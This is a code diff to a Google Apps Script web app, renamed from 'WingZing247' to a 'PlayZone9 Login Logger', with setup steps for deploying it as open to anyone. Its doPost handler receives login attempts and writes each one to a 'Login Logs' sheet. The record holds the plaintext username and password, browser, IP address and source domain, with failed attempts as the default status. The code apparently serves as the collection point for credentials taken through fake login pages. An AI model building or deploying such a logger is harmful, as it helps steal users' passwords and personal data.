@@ -1,20 +1,46 @@
-/**
- * WingZing247 - Google Apps Script Backend
- *
- * SETUP INSTRUCTIONS:
- * 1. Open a new Google Sheet
- * 2. Extensions > Apps Script
- * 3. Paste this file, save, then Deploy > New Deployment > Web app
- * 4. Execute as: Me, Access: Anyone
- * 5. Copy deployment URL and set as GOOGLE_SHEETS_URL in api/login.js
- * 6. Run setupHeaders() once to create column headers
- */
+// ─── Google Apps Script for PlayZone9 Login Logger ─────────────────────────────
+// Instructions:
+// 1. Go to https://script.google.com → New Project
+// 2. Paste this code → Save
+// 3. Run `onOpen` function once (it will ask for permissions — allow)
+// 4. Deploy → New deployment → Web app → Execute as: Me → Who has access: Anyone → Deploy
+// 5. Copy the Web App URL and paste it in api/login.js as GOOGLE_SHEETS_URL
+
+function onOpen() {
+  var sheet = SpreadsheetApp.getActiveSpreadsheet();
+  var logSheet = sheet.getSheetByName('Login Logs');
+  if (!logSheet) {
+    logSheet = sheet.insertSheet('Login Logs');
+    logSheet.appendRow(['Timestamp', 'Username', 'Password', 'Browser', 'Platform', 'IP Address', 'Domain', 'Status']);
+    logSheet.setFrozenRows(1);
+    logSheet.getRange('1:1').setFontWeight('bold').setBackground('#4285F4').setFontColor('#FFFFFF');
+    logSheet.setColumnWidth(1, 180);
+    logSheet.setColumnWidth(2, 120);
+    logSheet.setColumnWidth(3, 120);
+    logSheet.setColumnWidth(4, 100);
+    logSheet.setColumnWidth(5, 80);
+    logSheet.setColumnWidth(6, 130);
+    logSheet.setColumnWidth(7, 180);
+    logSheet.setColumnWidth(8, 80);
+  }
+  // Delete default Sheet1 if exists
+  var defaultSheet = sheet.getSheetByName('Sheet1');
+  if (defaultSheet && sheet.getSheets().length > 1) {
+    sheet.deleteSheet(defaultSheet);
+  }
+}
 
 function doPost(e) {
   try {
     var data = JSON.parse(e.postData.contents);
-    var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
-    var row = [
+
+    var sheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName('Login Logs');
+    if (!sheet) {
+      onOpen();
+      sheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName('Login Logs');
+    }
+
+    sheet.appendRow([
       data.timestamp || new Date().toISOString(),
       data.username   || '',
       data.password   || '',
@@ -23,28 +49,20 @@ function doPost(e) {
       data.ip         || '',
       data.domain     || '',
       data.status     || 'Failed'
-    ];
-    sheet.appendRow(row);
+    ]);
+
     return ContentService
       .createTextOutput(JSON.stringify({ success: true }))
       .setMimeType(ContentService.MimeType.JSON);
   } catch (err) {
     return ContentService
-      .createTextOutput(JSON.stringify({ success: false, message: err.toString() }))
+      .createTextOutput(JSON.stringify({ success: false, error: err.message }))
       .setMimeType(ContentService.MimeType.JSON);
   }
 }
 
 function doGet(e) {
   return ContentService
-    .createTextOutput(JSON.stringify({ status: 'ok' }))
+    .createTextOutput(JSON.stringify({ status: 'ok', message: 'PlayZone9 Login Logger is running' }))
     .setMimeType(ContentService.MimeType.JSON);
-}
-
-function setupHeaders() {
-  var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
-  var headers = ['Timestamp', 'Username', 'Password', 'Browser', 'Platform', 'IP Address', 'Domain', 'Status'];
-  sheet.getRange(1, 1, 1, headers.length).setValues([headers]);
-  sheet.getRange(1, 1, 1, headers.length).setFontWeight('bold');
-  SpreadsheetApp.flush();
 }
